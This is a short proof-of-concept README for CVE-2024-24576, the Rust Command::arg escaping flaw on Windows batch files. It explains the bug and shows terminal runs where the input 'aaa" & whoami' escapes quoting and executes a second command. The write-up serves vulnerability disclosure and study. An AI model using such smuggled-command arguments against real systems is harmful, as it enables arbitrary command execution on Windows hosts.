# CVE-2024-24576 PoC


The ```Command::arg``` and ```Command::args``` APIs state in their documentation that the arguments will be passed to the spawned process as-is, regardless of the content of the arguments, and will not be evaluated by a shell. This means it should be safe to pass untrusted input as an argument.

On Windows, the implementation of this is more complex than other platforms, because the Windows API only provides a single string containing all the arguments to the spawned process, and it's up to the spawned process to split them. Most programs use the standard C run-time argv, which in practice results in a mostly consistent way arguments are splitted.

One exception though is cmd.exe (used among other things to execute batch files), which has its own argument splitting logic. That forces the standard library to implement custom escaping for arguments passed to batch files. Unfortunately it was reported that our escaping logic was not thorough enough, and it was possible to pass malicious arguments that would result in arbitrary shell execution.


Running the main.rs file with the following payloads give 

```
C:\Users\frost\testing>cargo run
   Compiling testing v0.1.0 (C:\Users\frost\testing)
    Finished dev [unoptimized + debuginfo] target(s) in 0.49s
     Running `target\debug\testing.exe`
enter payload here
aaa
Output:
Argument received: aaa
```

```
C:\Users\frost\testing>cargo run
    Finished dev [unoptimized + debuginfo] target(s) in 0.01s
     Running `target\debug\testing.exe`
enter payload here
aaa & whoami
Output:
Argument received: "aaa & whoami"
```

```
C:\Users\frost\testing>cargo run
    Finished dev [unoptimized + debuginfo] target(s) in 0.01s
     Running `target\debug\testing.exe`
enter payload here
aaa" & whoami
Output:
Argument received: "aaa\"
desktop-8j2vk8b\frost
```

Note the escaped argument with the " whoami

NOT MY FINDING!

Sources:
https://github.com/rust-lang/rust/security/advisories/GHSA-q455-m56c-85mh
https://www.bleepingcomputer.com/news/security/critical-rust-flaw-enables-windows-command-injection-attacks/
